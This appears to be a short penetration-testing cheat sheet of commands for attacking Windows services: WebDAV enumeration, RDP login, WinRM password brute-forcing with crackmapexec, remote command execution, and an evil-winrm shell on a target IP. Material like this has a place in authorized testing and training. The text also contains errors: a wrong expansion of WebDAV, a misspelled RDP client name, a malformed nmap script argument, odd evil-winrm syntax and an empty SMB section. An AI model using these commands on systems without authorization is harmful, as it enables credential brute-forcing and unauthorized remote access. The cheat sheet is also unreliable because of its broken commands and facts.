The command below should be used after enumerating the port and finding the services running on that specific port using nmap.
# WEBDAV ( WEB-BASED DISTRIBUTED AUTHORITY & VERSIONING)

## NMAP

this script will  perform a basic nmap scan on the target IP address. It uses the following options: --script  http-webdav-scan.
it will scan if there's any webdav directory on the target. 

```bash
nmap -p 80 --script http-enum ,http-webdav $IP
```

## DAVTEST

```bash
davtest -auth username:password -url http://$IP/webdav
```

# SMB ( SERVER MESSAGE BLOCK)

# RDP (Remote Desktop Protocol)

BruteFOrce >> 

```bash
xfreedp /u:administrator /p:password /v:$IP:3389
```

# WinRM ( Windows Remote Management Protocol)

## crackmapexec

### brute force

```bash
$ crackmapexec winrm $IP -u administrator -p passwordlist.txt
```

### command execution

```bash
$ crackmapexec winrm $IP -u administrator -p correct_password -x "whoami"
```

### shell session evil-winrm

this will provide a command session shell to  the target machine using windows remote management protocol.
```bash
$ evil-winrm.rb winrm -i $IP -u administrator -p correct_password 
```